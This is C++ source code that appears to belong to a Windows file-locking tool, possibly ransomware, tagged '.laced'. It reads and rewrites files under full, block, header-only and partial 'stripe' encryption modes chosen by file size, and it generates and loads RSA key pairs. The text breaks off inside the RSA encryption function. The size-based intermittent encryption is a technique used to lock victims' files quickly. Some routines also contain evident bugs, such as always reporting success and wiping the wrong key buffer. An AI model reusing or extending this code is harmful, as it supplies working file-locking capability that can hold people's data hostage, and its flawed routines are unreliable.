#include <windows.h>
#include <fileapi.h>
#include <stdio.h>
#include <string>
#include <map>
#include <bcrypt.h>

#include "filesystem.h"
#include "memory.h"
#include "sha/sha256.h"
#include "logs.h"

#pragma comment(lib, "bcrypt.lib")

#define ECRYPT_NAME_P L".laced"
#define ECRYPT_NAME_LEN 6

#define SET(v,w) ((v) = (w))

std::mutex g_MutexBcrypt;

STATIC BOOL WriteFullData
(
	HANDLE hFile,
	LPVOID Buffer,
	DWORD Size
)
{
	DWORD TotalWritten = 0;
	DWORD BytesWritten = 0;
	DWORD BytesToWrite = Size;
	DWORD Offset = 0;

	while (TotalWritten != Size)
	{

		if (!WriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten)
		{
			return FALSE;
		}

		Offset += BytesWritten;
		TotalWritten += BytesWritten;
		BytesToWrite -= BytesWritten;
	}
	
	/*
	DWORD BytesWritten;
	do
	{
		if(ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL))
			WriteFile(hFile2, FileBuffer, dwread, &BytesWritten, NULL);
	} while (dwread < BytesRead);*/

	return TRUE;
}

BOOL filesystem::getParseFile
(
	PFILE_INFO FileInfo
)
{		
	FileInfo->FileHandle = CreateFileW(FileInfo->FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (FileInfo->FileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[GetParseFile] Failed File is already open by another program; %ls", FileInfo->Filename);		
		return FALSE;
	}	

	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(FileInfo->FileHandle, &FileSize))
	{
		LOG_ERROR(L"[GetParseFile] Failed file must not be empty; %ls", FileInfo->Filename);
		return FALSE;
	}
	if (!FileSize.QuadPart)
	{
		LOG_ERROR(L"[GetParseFile] Failed file must not be empty; %ls", FileInfo->Filename);
		return FALSE;
	}
	FileInfo->Filesize = FileSize.QuadPart;
	return TRUE;
}

BOOL filesystem::CreateFileOpen(PFILE_INFO FileInfo, DWORD state_const)
{
	FileInfo->newFileHandle = CreateFileW(FileInfo->newFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, state_const, 0, NULL);
	if (FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[CreateFileOpen] Failed Create File; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());			
		return FALSE;
	}	 
	return TRUE;
}

BOOL filesystem::EncryptFileFullData(PFILE_INFO FileInfo)
{
	BOOL success = FALSE;
	DWORD BytesRead = FileInfo->Filesize;
	DWORD dwread = 0;
	DWORD padding = 0;	
	BOOL isAes = FileInfo->CryptInfo->method_policy == AES256 || FileInfo->CryptInfo->method_policy == RSA_AES256;
	if (isAes && global::GetDeCrypt() == EncryptCipher::CRYPT)
		padding = aes256_padding(BytesRead) - BytesRead;
	
	BYTE* FileBuffer = (BYTE*)memory::m_malloc(BytesRead + padding);
	if (!FileBuffer)
	{
		LOG_ERROR(L"[EncryptFileFullData] Large File Size %ls. Buffer heap crash", FileInfo->Filename);
		goto end;
	}

	if (!ReadFile(FileInfo->FileHandle, FileBuffer, BytesRead, &dwread, NULL))
	{
		LOG_ERROR(L"[EncryptFileFullData] File is failed to ReadFile; %ls", FileInfo->Filename);
		goto end;
	}
		
	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, FileBuffer, FileBuffer, BytesRead);
	
	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, BytesRead + padding))
	{
		LOG_ERROR(L"[EncryptFileFullData] File is failed to write; %ls", FileInfo->Filename);
		goto end;
	}
	
	if(isAes && global::GetDeCrypt() == EncryptCipher::DECRYPT)
	{
		SetFilePointer(FileInfo->newFileHandle, -FileInfo->padding, NULL, FILE_END);
		SetEndOfFile(FileInfo->newFileHandle);		
	}

	success = TRUE;
end:
	if(FileBuffer) memory::m_free(FileBuffer);	
	return TRUE;
}


BOOL filesystem::EncryptFilePartly
(
	PFILE_INFO FileInfo,	
	BYTE DataPercent
)
{
	BOOL success = FALSE;
	DWORD multiply = 0;
	DWORD BytesRead;
	DWORD BytesReadW;
	LONGLONG TotalRead;
	LONGLONG PartSize = 0;
	LONGLONG StepSize = 0;
	INT StepsCount = 0;
	LONGLONG Size = FileInfo->Filesize;	
	
	switch (DataPercent)
	{
	case 20:
		PartSize = (Size / 100) * 7;
		StepsCount = 3;
		StepSize = (Size - (PartSize * 3)) / 2;
		break;

	case 50:
		PartSize = (Size / 100) * 10;
		StepsCount = 5;
		StepSize = PartSize;
		break;

	default:
		return FALSE;
	}
	
	BOOL isAes = FileInfo->CryptInfo->method_policy == AES256 || FileInfo->CryptInfo->method_policy == RSA_AES256;
	if (isAes)
	{
		if (PartSize < AES_BLOCK_SIZE)
		{
			LOG_ERROR(L"[EncryptFilePartly] Failed - small size file, size must be >= 300 byte. Filename: %ls\n", FileInfo->Filename);
			return FALSE;
		}
		multiply = PartSize % 16;
	}

		
	BYTE* BufferPart = (BYTE*)memory::m_malloc(PartSize);
	BYTE* BufferStep = (BYTE*)memory::m_malloc(StepSize);
	if (!BufferPart || !BufferStep)
	{
		LOG_ERROR(L"[EncryptFilePartly] Large File Size. Buffer heap crash; %ls", FileInfo->Filename);
		return FALSE;
	}

	for (INT i = 0; i < StepsCount; ++i)
	{
		if (!ReadFile(FileInfo->FileHandle, BufferPart, PartSize, &BytesRead, NULL) || !BytesRead)
		{	 
			LOG_ERROR(L"[EncryptFilePartly] Failed File to Read Data; %ls", FileInfo->FilePath);
			goto end;
		}

		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, BufferPart, BufferPart, BytesRead - multiply);

		if (!WriteFullData(FileInfo->newFileHandle, BufferPart, BytesRead))
		{
			LOG_ERROR(L"[EncryptFilePartly] Failed File to Write data; %ls", FileInfo->FilePath);
			goto end;
		}
		TotalRead = 0;
		while (TotalRead < StepSize)
		{
			if (!ReadFile(FileInfo->FileHandle, BufferStep, StepSize, &BytesReadW, NULL) || !BytesReadW)
				break;
			if (!WriteFullData(FileInfo->newFileHandle, BufferStep, BytesReadW))
				break;
			TotalRead += BytesReadW;
		}
	}

	success = TRUE;

end:
	if(BufferPart)
		memory::m_free(BufferPart);
	if(BufferStep)
		memory::m_free(BufferStep);	

	return success;
}

BOOL filesystem::EncryptFileBlock
(
	PFILE_INFO FileInfo	
)
{
	BOOL success = FALSE;
	DWORD BytesRead;
	u32 padding = 0;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576 + AES_BLOCK_SIZE); // 1 MB

	while(ReadFile(FileInfo->FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
	{
		if (BytesRead < 1048576 && FileInfo->CryptInfo->method_policy == AES256)
		{
			padding = BytesRead % 16;
			BytesRead -= padding;			
		}
		
		FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, &FileInfo->padding, Buffer, Buffer, BytesRead);

		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead + padding))
		{
			LOG_ERROR(L"[EncryptFileBlock] [WriteFullData] Failed. GetLastError = %lu", GetLastError());
			goto end;
		}
	}

	if (FileInfo->CryptInfo->method_policy == AES256 && global::GetDeCrypt() == EncryptCipher::DECRYPT)
	{
		SetFilePointer(FileInfo->newFileHandle, -FileInfo->padding, NULL, FILE_END);
		SetEndOfFile(FileInfo->newFileHandle);
	}

	success = TRUE;
end:
	memory::m_free(Buffer);
	return TRUE;
}

BOOL filesystem::EncryptFileHeader
(
	PFILE_INFO FileInfo
)
{	
	if (FileInfo->Filesize < 1048576)
	{
		LOG_ERROR(L"[EncryptFileHeader] FileSize must be > 1.0 MB; %ls", FileInfo->Filename);		
		return FALSE;
	}

	BOOL success = FALSE;
	DWORD BytesEncrypt = 1048576;
	DWORD BytesRead;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
	if (!Buffer)
	{
		LOG_ERROR(L"Heap Crash\n");
		return FALSE;
	}
	if (!ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL))
	{
		LOG_ERROR(L"[EncryptFileHeader] Failed ReadFile; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		goto end;
	}
	
	if (BytesRead == 0)
	{
		LOG_ERROR(L"[EncryptFileHeader] Unexpected BytesRead. GetLastError = %lu", GetLastError());
		goto end;
	}

	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->ctx, 0, Buffer, Buffer, BytesEncrypt);	
	
	if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesEncrypt))
	{
		LOG_ERROR(L"[EncryptFileHeader] [WriteFullData] failed. GetLastError = %lu", GetLastError());
		goto end;
	}

	while (ReadFile(FileInfo->FileHandle, Buffer, BytesEncrypt, &BytesRead, NULL) && BytesRead != 0)
	{
		if (!WriteFullData(FileInfo->newFileHandle, Buffer, BytesRead))
		{
			LOG_ERROR(L"[EncryptFileHeader] [WriteFullData] failed. GetLastError = %lu", GetLastError());
			goto end;
		}
	}

	success = TRUE;

end:
	memory::m_free(Buffer);
	return success;
}


// TODO
BOOL filesystem::ReadFile_
(
	PFILE_INFO FileInfo
) {return FALSE;}

//BOOL filesystem::ReadFile_
//(
//	locker::PFILE_INFO FileInfo
//)
//{
//	HANDLE hFile = CreateFileW(FileInfo->FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
//
//	if (hFile == INVALID_HANDLE_VALUE)
//	{
//		printf_s("File %ls is already open by another program.\n", FileInfo->Filename);
//		CloseHandle(hFile);
//		return FALSE;
//	}
//
//	LARGE_INTEGER FileSize;
//	if (!GetFileSizeEx(hFile, &FileSize))
//	{
//		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
//		CloseHandle(hFile);
//		return FALSE;
//	}
//	if (!FileSize.QuadPart)
//	{
//		printf_s("The file %ls must not be empty.\n", FileInfo->Filename);
//		CloseHandle(hFile);
//		return FALSE;
//	}
//
//	BYTE* FileBuffer = (BYTE*)memory::m_malloc(FileSize.QuadPart);
//	if (!FileBuffer)
//	{
//		memory::m_free(FileBuffer);
//		CloseHandle(hFile);
//		return FALSE;
//	}
//
//	DWORD dwread = 0;
//	BOOL Success = ReadFile(hFile, FileBuffer, FileSize.QuadPart, &dwread, NULL);
//	DWORD BytesRead = FileSize.QuadPart;
//	if (!Success || dwread != BytesRead)
//	{
//		printf_s("File %ls is failed to ReadFile.\n", FileInfo->FilePath);
//		memory::m_free(FileBuffer);
//		CloseHandle(FileInfo->FileHandle);
//		return FALSE;
//	}
//
//	BOOL SUCCESSS;
//
//	LARGE_INTEGER Offset;
//	Offset.QuadPart = -((LONGLONG)dwread);
//	
//	FileInfo->CryptInfo->crypt_method(FileInfo, FileInfo->CryptInfo->ctx, &FileInfo->CryptInfo->padding, FileBuffer, FileBuffer, BytesRead);
//	printf_s("%s", FileBuffer);
//
//	RtlSecureZeroMemory(FileBuffer, sizeof(FileBuffer));
//	memory::m_free(FileBuffer);
//	CloseHandle(hFile);
//
//
//	return TRUE;
//}



BOOL filesystem::OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode)
{
	if (mode == EncryptModes::AUTO_ENCRYPT)
	{
		if (FileInfo->Filesize <= 1048576)
		{
			if (!filesystem::EncryptFileFullData(FileInfo))
			{
				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileFullData]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
				return FALSE;
			}
			mode = EncryptModes::FULL_ENCRYPT;
		}
		else if (FileInfo->Filesize <= 5242880)
		{
			if (!filesystem::EncryptFilePartly(FileInfo, 20))
			{
				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFilePartly]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
				return FALSE;
			}
			mode = EncryptModes::PARTLY_ENCRYPT;
		}
		else
		{
			if (!filesystem::EncryptFileHeader(FileInfo))
			{
				LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileHeader]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
				return FALSE;
			}
			mode = EncryptModes::HEADER_ENCRYPT;
		}
	}
	else if (mode == EncryptModes::FULL_ENCRYPT)
	{
		if (!filesystem::EncryptFileFullData(FileInfo))
		{
			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileFullData]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
			return FALSE;
		}
		mode = EncryptModes::FULL_ENCRYPT;
	}
	else if (mode == EncryptModes::PARTLY_ENCRYPT)
	{
		if (!filesystem::EncryptFilePartly(FileInfo, 20))
		{
			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFilePartly]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
			return FALSE;
		}
		mode = EncryptModes::PARTLY_ENCRYPT;
	}
	else if (mode == EncryptModes::HEADER_ENCRYPT)
	{
		if (!filesystem::EncryptFileHeader(FileInfo))
		{
			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileHeader]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
			return FALSE;
		}
		mode = EncryptModes::HEADER_ENCRYPT;
	}
	else if (mode == EncryptModes::BLOCK_ENCRYPT)
	{
		if (!filesystem::EncryptFileBlock(FileInfo))
		{
			LOG_ERROR(L"[OptionEncryptMode] Failed to [EncryptFileBlock]; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
			return FALSE;
		}
		mode = EncryptModes::BLOCK_ENCRYPT;
	}

	return TRUE;
}







HMODULE hCrypt32 = NULL;
CryptBinaryToStringA_t pCryptBinaryToStringA = NULL;
CryptStringToBinaryA_t pCryptStringToBinaryA = NULL;
CryptBinaryToStringW_t pCryptBinaryToStringW = NULL;
CryptStringToBinaryW_t pCryptStringToBinaryW = NULL;


BOOL LoadCrypt32()
{
	if (!hCrypt32)
		hCrypt32 = LoadLibraryA("Crypt32.dll");
	if (hCrypt32 != NULL)
	{
		pCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddress(hCrypt32, "CryptBinaryToStringA");
		pCryptStringToBinaryA = (CryptStringToBinaryA_t)GetProcAddress(hCrypt32, "CryptStringToBinaryA");
		pCryptBinaryToStringW = (CryptBinaryToStringW_t)GetProcAddress(hCrypt32, "CryptBinaryToStringW");
		pCryptStringToBinaryW = (CryptStringToBinaryW_t)GetProcAddress(hCrypt32, "CryptStringToBinaryW");
	}
	else return FALSE;
	return TRUE;
}

VOID UnLoadCrypt32()
{
	if (hCrypt32)
	{
		FreeLibrary(hCrypt32);
		hCrypt32 = NULL;
	}
}


STATIC BOOL Base64Encode
(	
	VOID** ptr_Base64,
	BYTE* BuffKey,
	size_t SizeKey,
	DWORD* return_size,
	size_t mode
)
{
	DWORD size = 0;
		
	if (mode == BINARY_CRYPT) // Binary -> Base64  
	{
		if (!pCryptBinaryToStringA)
		{
			LOG_ERROR(L"Failed to get function address Crypt32.dll\n");
			return FALSE;
		}
		if (!pCryptBinaryToStringA(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}

		*ptr_Base64 = (CHAR*)memory::m_malloc(size);
		if (!pCryptBinaryToStringA(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (CHAR*)*ptr_Base64, &size))
		{
			LOG_ERROR(L"Failed to convert KEY to Base64. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	else if(mode == BASE_CRYPT)// Base64 -> Binary
	{
		if (!pCryptStringToBinaryA)
		{
			LOG_ERROR(L"Failed to get function address Crypt32.dll\n");
			return FALSE;
		}
		if (!pCryptStringToBinaryA((CHAR*)BuffKey, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}
		
		*ptr_Base64 = (BYTE*)memory::m_malloc(size);
		if (!pCryptStringToBinaryA((CHAR*)BuffKey, 0, CRYPT_STRING_BASE64, (BYTE*)*ptr_Base64, &size, NULL, NULL))
		{
			LOG_ERROR(L"Failed to convert KEY to Base64. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}		
	}
	else if (mode == BINARY_CRYPT_W)
	{
		if (!pCryptBinaryToStringW)
		{
			LOG_ERROR(L"Failed to get function address Crypt32.dll\n");
			return FALSE;
		}

		if (!pCryptBinaryToStringW(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}

		*ptr_Base64 = (WCHAR*)memory::m_malloc(size * sizeof(WCHAR));
		if (!pCryptBinaryToStringW(BuffKey, SizeKey, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (WCHAR*)*ptr_Base64, &size))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	else if (mode == BASE_CRYPT_W)
	{
		if (!pCryptStringToBinaryW)
		{
			LOG_ERROR(L"Failed to get function address Crypt32.dll\n");
			return FALSE;
		}

		if (!pCryptStringToBinaryW((WCHAR*)BuffKey, 0, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			return FALSE;
		}

		*ptr_Base64 = (BYTE*)memory::m_malloc(size);
		if(!pCryptStringToBinaryW((WCHAR*)BuffKey, 0, CRYPT_STRING_BASE64, (BYTE*)*ptr_Base64, &size, NULL, NULL))
		{
			LOG_ERROR(L"Failed to get KEY Base64 size. GetLastError = %lu\n", GetLastError());
			memory::m_free(*ptr_Base64);
			*ptr_Base64 = NULL;
			return FALSE;
		}
	}
	
	
	*return_size = size;
	return TRUE;
}

BOOL filesystem::DropRSAKey
(
	WCHAR* Path,
	BYTE PublicKey[],
	BYTE PrivateKey[],
	DWORD SizeKey,
	DWORD p_SizeKey
)
{
	BOOL SUCCESS_return = FALSE;
	HANDLE hFile_prv = NULL;
	HANDLE hFile_pub = NULL;
	std::wstring key_pub(Path);	
	key_pub += std::wstring(L"/RSA_public_key_laced.txt");
	LOG_INFO(L"Path public_key_file\t%ls", key_pub.c_str());
	
	hFile_pub = CreateFileW(key_pub.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	std::wstring key_prv(Path);	
	key_prv += std::wstring(L"/RSA_private_key_laced.txt");
	LOG_INFO(L"Path private_key_file\t%ls", key_prv.c_str());

	hFile_prv = CreateFileW(key_prv.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

	if (hFile_pub == INVALID_HANDLE_VALUE || hFile_prv == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"Failed create key files %ls. GetLastError = %lu", Path, GetLastError());
		goto END;
	}

	if (global::GetRsaBase64())
	{
		VOID* Base64PublicKey = NULL;
		VOID* Base64PrivateKey = NULL;
		DWORD size_pub;
		DWORD size_prv;

		if (!Base64Encode(&Base64PublicKey, PublicKey, SizeKey, &size_pub, BINARY_CRYPT))
		{
			LOG_ERROR(L"[Base64Encode] Failed Public Key convert Base64; %ls; GetLastError = %lu", Path, GetLastError());
			goto ENDB;
		}
		if (!Base64Encode(&Base64PrivateKey, PrivateKey, p_SizeKey, &size_prv, BINARY_CRYPT))
		{
			LOG_ERROR(L"[Base64Encode] Failed Private Key convert Base64; %ls; GetLastError = %lu", Path, GetLastError());
			goto ENDB;
		}
		
		if (Base64PublicKey == NULL || Base64PrivateKey == NULL)
		{
			LOG_ERROR(L"[Base64Encode] Failed RSA Key convert Base64; GetLastError = %lu", GetLastError());
			goto ENDB;
		}
		LARGE_INTEGER Offset;
		Offset.QuadPart = -((LONGLONG)size_pub);
		if (!SetFilePointerEx(hFile_pub, Offset, NULL, FILE_CURRENT))

		if (!WriteFullData(hFile_pub, Base64PublicKey, size_pub))
		{
			LOG_ERROR(L"[WriteFullData] Failed to write public key");
			goto ENDB;
		}


		Offset.QuadPart = -((LONGLONG)size_prv);
		if (!SetFilePointerEx(hFile_prv, Offset, NULL, FILE_CURRENT))

		if (!WriteFullData(hFile_prv, Base64PrivateKey, size_prv))
		{
			LOG_ERROR(L"[WriteFullData] Failed to write private key");
			goto ENDB;
		}

		SUCCESS_return = TRUE;

	ENDB:
		if (Base64PublicKey)
		{
			memory::memzero_explicit(Base64PublicKey, size_pub);
			memory::m_free(Base64PublicKey);
		}
		if (Base64PrivateKey)
		{
			memory::memzero_explicit(Base64PublicKey, size_prv);
			memory::m_free(Base64PrivateKey);
		}
		if (hFile_pub)
			CloseHandle(hFile_pub);
		if (hFile_prv)
			CloseHandle(hFile_prv);

		return SUCCESS_return;
	}


	LARGE_INTEGER Offset;
	Offset.QuadPart = -((LONGLONG)SizeKey);
	if (!SetFilePointerEx(hFile_pub, Offset, NULL, FILE_CURRENT))

	if (!WriteFullData(hFile_pub, PublicKey, SizeKey))
	{
		LOG_ERROR(L"[WriteFullData] Failed to write public key\n");
		goto END;
	}


	Offset.QuadPart = -((LONGLONG)p_SizeKey);
	if (!SetFilePointerEx(hFile_prv, Offset, NULL, FILE_CURRENT))

	if (!WriteFullData(hFile_prv, PrivateKey, p_SizeKey))
	{
		LOG_ERROR(L"[WriteFullData] Failed to write private key\n");
		goto END;
	}

	SUCCESS_return = TRUE;
	
END:
	if(hFile_pub)
		CloseHandle(hFile_pub);
	if(hFile_prv)
		CloseHandle(hFile_prv);

	return SUCCESS_return;
}


BOOL HandleError(NTSTATUS status)
{
	if (!BCRYPT_SUCCESS(status))
	{
		LOG_ERROR(L"BCrypt API failed. NTSTATUS = 0x%02X", status);
		return FALSE;
	}

	return TRUE;
}


BOOL filesystem::HandlerGenKeyPairRSA()
{
	BCRYPT_ALG_HANDLE hProvider = NULL;
	BCRYPT_KEY_HANDLE hKey = NULL;
	NTSTATUS status = 0;
	DWORD dwPublicKeySize = 0;
	DWORD dwPrivateKeySize = 0;
	BYTE* PublicKey = NULL;
	BYTE* PrivateKey = NULL;


	if (!HandleError
		(BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_RSA_ALGORITHM, NULL, 0)))
	{
		LOG_ERROR(L"[BCryptOpenAlgorithmProvider] Failed");
		goto end;
	}
	
	if (!HandleError
		(BCryptGenerateKeyPair(hProvider, &hKey, global::GetBitKey(), 0)))
	{
		LOG_ERROR(L"[BCryptGenerateKeyPair] Failed");
		goto end;
	}

	if (!HandleError
		(BCryptFinalizeKeyPair(hKey, 0)))
	{
		LOG_ERROR(L"[BCryptFinalizeKeyPair] Failed");
		goto end;
	}

	if (!HandleError
		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, NULL, 0, &dwPublicKeySize, 0)))
	{
		LOG_ERROR(L"[BCryptExportKeySize] Failed");
		goto end;
	}

	PublicKey = (BYTE*)memory::m_malloc(dwPublicKeySize);	
	if (!HandleError
		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPUBLIC_BLOB, PublicKey, dwPublicKeySize, &dwPublicKeySize, 0)))
	{
		LOG_ERROR(L"[BCryptExportKey] Failed");
		goto end;
	}
	
	if (!HandleError
		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, NULL, 0, &dwPrivateKeySize, 0)))
	{
		LOG_ERROR(L"[BCryptExportKeySize] Failed");
		goto end;
	}

	PrivateKey = (BYTE*)memory::m_malloc(dwPrivateKeySize);	
	if (!HandleError
		(BCryptExportKey(hKey, NULL, BCRYPT_RSAPRIVATE_BLOB, PrivateKey, dwPrivateKeySize, &dwPrivateKeySize, 0)))
	{
		LOG_ERROR(L"[BCryptExportKey] Failed");
		goto end;
	}

	if (!DropRSAKey(global::GetPath(), PublicKey, PrivateKey, dwPublicKeySize, dwPrivateKeySize))
	{
		LOG_ERROR(L"[DropRSAKey] Failed; path %ls; GetLastError = %lu", global::GetPath(), GetLastError());
		goto end;
	}

	LOG_SUCCESS(L"Public Key (%lu bytes) generated and saved in: %ls\n", dwPublicKeySize, global::GetPath());
	LOG_SUCCESS(L"Private Key (%lu bytes) generated and saved in: %ls\n", dwPrivateKeySize, global::GetPath());

end:
	if (PublicKey)
	{
		memory::memzero_explicit(PublicKey, dwPublicKeySize);
		memory::m_free(PublicKey);
	}
	if (PrivateKey)
	{
		memory::memzero_explicit(PrivateKey, dwPrivateKeySize);
		memory::m_free(PrivateKey);
	}
	if (hKey)
		BCryptDestroyKey(hKey);
	if (hProvider)
		BCryptCloseAlgorithmProvider(hProvider, 0);

	return TRUE;
}


BOOL filesystem::ReadRSAFile
(
	CRYPT_INFO* CryptInfo
)
{
	BOOL success = FALSE;
	HANDLE hCryptFile = NULL;	
	DWORD dwread;
	NTSTATUS status;
	DWORD resByte = 0;

	status = BCryptOpenAlgorithmProvider(&CryptInfo->desc.crypto_provider, BCRYPT_RSA_ALGORITHM, NULL, 0);
	if(!HandleError(status))
	{
		LOG_ERROR(L"[BCryptOpenAlgorithmProvider] Failed");
		return FALSE;
	}

	hCryptFile = CreateFileW(CryptInfo->desc.rsa_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hCryptFile == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[ReadRSAFile] Failed Open key file; %ls; GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
		return FALSE;
	}

	LARGE_INTEGER FileSize;
	if (!GetFileSizeEx(hCryptFile, &FileSize) || FileSize.QuadPart == 0)
	{
		LOG_ERROR(L"[ReadRSAFile] File must not be empty; %ls", CryptInfo->desc.rsa_path);
		return FALSE;
	}

	CryptInfo->desc.size = FileSize.QuadPart;
	if (!ReadFile(hCryptFile, CryptInfo->desc.key_data, CryptInfo->desc.size, &dwread, NULL) || dwread != FileSize.QuadPart)
	{
		LOG_ERROR(L"[ReadRSAFile] Failed Key ReadFile; %ls", CryptInfo->desc.rsa_path);
		return FALSE;
	}
	
	
	CONST WCHAR* bcrpyt_blob = global::GetDeCrypt() == EncryptCipher::CRYPT ? BCRYPT_RSAPUBLIC_BLOB : BCRYPT_RSAPRIVATE_BLOB;

	if (global::GetRsaBase64())
	{
		VOID* Base64Key = NULL;
		DWORD size;
		if (!Base64Encode(&Base64Key, CryptInfo->desc.key_data, CryptInfo->desc.size, &size, BASE_CRYPT))
		{
			LOG_ERROR(L"[ReadRSAFile] Failed RSA Key convert Base64; %ls. GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
			goto END;
		}

		if (Base64Key == NULL)
		{
			LOG_ERROR(L"[ReadRSAFile] Failed RSA Key convert Base64; %ls. GetLastError = %lu", CryptInfo->desc.rsa_path, GetLastError());
			goto END;
		}
						
		if (!HandleError
			(
				BCryptImportKeyPair(CryptInfo->desc.crypto_provider, 
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, (BYTE*)Base64Key, 
				size, 0))
			)
		{
			LOG_ERROR(L"[ReadRSAFile] [BCryptImportKeyPair] Failed");
			goto END;
		}
		CryptInfo->desc.size = size;
		memory::memzero_explicit(Base64Key, size);
		memory::m_free(Base64Key);
		success = TRUE;
		goto END;
	}
	else
	{		
		if (!HandleError
		(
			BCryptImportKeyPair
			(
				CryptInfo->desc.crypto_provider,
				NULL, bcrpyt_blob,
				&CryptInfo->desc.handle_rsa_key, CryptInfo->desc.key_data,
				CryptInfo->desc.size, 0
			)
		))
		{
			LOG_ERROR(L"[ReadRSAFile] [BCryptImportKeyPair] Failed");
			LOG_INFO(L"[ReadRSAFile] if key in format Base64 - check flag -B64");
			goto END;
		}
	}
	
	
	status = BCryptGetProperty
	(
		CryptInfo->desc.handle_rsa_key,
		BCRYPT_KEY_LENGTH,
		(PUCHAR)&CryptInfo->desc.size,
		sizeof(CryptInfo->desc.size),
		&resByte,
		0
	);
	if (!HandleError(status) || resByte != 4)
	{
		LOG_ERROR(L"[ReadRSAFile] Failed Get size");
		goto END;
	}
	if ((CryptInfo->desc.size /= 8) % 8 != 0)
	{
		LOG_ERROR(L"[ReadRSAFile] Invalid Size");
		goto END;
	}

	success = TRUE;
END:
	if (hCryptFile != NULL && hCryptFile != INVALID_HANDLE_VALUE)
		CloseHandle(hCryptFile);
	return success;
}


/*	ONLY RSA & ONLY (RSA_BYTE - 11) => FILESIZE	*/
BOOL filesystem::EncryptRSA 
(	
	PFILE_INFO FileInfo
)
{
	BOOL SUCCESS_return = FALSE;	
	NTSTATUS status;
	DWORD size = 0;
	DWORD dwDataLen = 0;

	if (global::GetDeCrypt() == EncryptCipher::CRYPT && FileInfo->Filesize >= FileInfo->CryptInfo->desc.size - 11)
	{
		LOG_ERROR(L"[EncryptRSA] Invalid Size File >= RSA_BYTE - PADDING(11); %ls", FileInfo->Filename);
		return FALSE;
	}
	else if (global::GetDeCrypt() == EncryptCipher::DECRYPT && FileInfo->Filesize < FileInfo->CryptInfo->desc.size)
	{
		LOG_ERROR(L"[EncryptRSA] Invalid Size File < RSA_BYTE; %ls", FileInfo->Filename);
		return FALSE;
	}

	BYTE* FileBuffer = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);

	if (!ReadFile(FileInfo->FileHandle, FileBuffer, FileInfo->Filesize, &size, NULL) || FileInfo->Filesize != size)
